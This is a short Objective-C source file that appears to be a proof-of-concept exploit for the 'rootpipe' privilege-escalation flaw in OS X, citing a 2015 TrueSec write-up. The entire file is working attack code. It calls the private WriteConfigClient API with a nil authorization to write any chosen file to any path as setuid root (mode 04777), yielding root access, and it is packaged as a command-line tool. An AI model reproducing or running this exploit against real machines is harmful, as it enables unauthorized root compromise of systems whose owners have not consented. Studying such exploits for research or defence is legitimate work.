#import <Foundation/Foundation.h>

#import <objc/runtime.h>

// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/

int main(int argc, const char *argv[])
{
	if (argc != 3)
	{
		fprintf(stderr, "usage: rootpipe source target\n");
		
		return EXIT_FAILURE;
	}
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	NSData *data = [NSData dataWithContentsOfFile:@(argv[1])];
	NSString *path = @(argv[2]);
	
	id client = [objc_lookUpClass("WriteConfigClient") sharedClient];
	
	[client authenticateUsingAuthorizationSync:nil];
	
	id tool = [client remoteProxy];
	
	[tool createFileWithContents:data path:path attributes:@{ NSFilePosixPermissions: @04777 }];
	
	[pool drain];
	
	return EXIT_SUCCESS;
}
